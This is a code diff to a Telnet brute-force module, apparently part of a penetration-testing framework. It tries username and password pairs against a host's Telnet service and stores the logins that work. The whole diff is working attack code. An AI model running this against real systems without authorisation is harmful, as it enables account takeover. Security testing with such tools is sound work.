@@ -2,11 +2,12 @@ from jframework.modules.login._bruteforce import _Bruteforce
 import sys
 import telnetlib
 
+
 class Telnetbruteforce(_Bruteforce):
 
     def worker(self, user, password):
         try:
-            tn = telnetlib.Telnet(self.HOST, 23, 1)
+            tn = telnetlib.Telnet(self.HOST, 23, 2)
             tn.read_until((b"login: " or b"Login: " ))
             tn.write(user.encode("ascii") + b"\n")
             tn.read_until((b"Password: " or b"password: "))
@@ -16,8 +17,10 @@ class Telnetbruteforce(_Bruteforce):
             tn.read_all()
             tn.close()
             self.print_result(user, password, error=False)
-            self.login_found += 1
-        except Exception as e:
+            self.lock.acquire()
+            self.add_credential(user, password, "telnet")
+            self.lock.release()
+        except:
             if (self.verb):
                 self.print_result(user, password, error=True)
             try:
@@ -29,13 +32,18 @@ class Telnetbruteforce(_Bruteforce):
 
     def run(self):
         try:
-            tn = telnetlib.Telnet(self.HOST)
+            tn = telnetlib.Telnet(self.HOST,timeout=3)
             resp = tn.expect([b"login: ", b"Login: "], 3)
             tn.close()
             if resp[1] is None:
                 raise Exception
-        except:
-            print("It doesn't work with that kind of telnet")
-            return
+        except Exception as e:
+            if("timed out" in str(e)):
+                print("No service found")
+            else:
+                print("It doesn't work with that kind of telnet")
+            return None, None
 
         super(Telnetbruteforce, self).run()
+
+        return self.sessions, self.credentials
